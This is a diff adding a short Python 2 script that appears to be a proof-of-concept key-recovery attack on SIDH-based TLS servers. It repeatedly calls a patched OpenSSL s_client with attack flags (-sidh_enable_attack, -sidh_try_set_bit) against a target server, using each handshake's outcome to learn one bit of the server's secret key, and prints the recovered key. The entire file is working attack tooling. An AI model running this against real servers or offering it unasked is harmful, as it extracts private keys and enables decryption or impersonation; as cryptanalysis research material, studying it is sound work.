@@ -1,0 +1,43 @@
+#!/usr/bin/env python
+import subprocess
+import sys
+
+OPENSSL = ''
+SERVER = ''
+def change_endian(order):
+    s = ""
+    for i in range(384 / 8):
+        i = (order >> (8 * i)) & 0xFF
+        s += hex(i)[2:-1].zfill(2)
+    return s
+
+def get_next(n, order, retries=0):
+    s = change_endian(order)
+    cmd = "echo 'GET /' | {} s_client -connect '{}' -sidh_enable_attack -sidh_known_bits {} -sidh_known_order {}".format(OPENSSL, SERVER, n, s)
+    ret_0 = subprocess.call(cmd + " 2>&1 | grep -q DONE", shell=True)
+    cmd += " -sidh_try_set_bit"
+    ret_1 = subprocess.call(cmd + " 2>&1 | grep -q DONE", shell=True)
+    if (ret_0 and ret_1) or (not ret_0 and not ret_1):
+        sys.stderr.write("Inconsistent result: ({},{})\n".format(ret_0, ret_1))
+        sys.stderr.write("Known bits: {}\n".format(s))
+        if retries == 5:
+            print s
+            sys.exit(1)
+        return get_next(n, order, retries+1)
+
+    if ret_0:
+        return order + (2L ** n)
+    return order
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        sys.stderr.write("Parameters: patched_openssl_binary server\n")
+        sys.exit(1)
+    OPENSSL = sys.argv[1]
+    SERVER = sys.argv[2]
+    order = 0L
+    for i in range(370):
+        order = get_next(i, order)
+        sys.stderr.write(hex(order)[2:-1].zfill(96) + " (known: " + str(i+1) + ")\r")
+    sys.stderr.write('\n')
+    print change_endian(order)
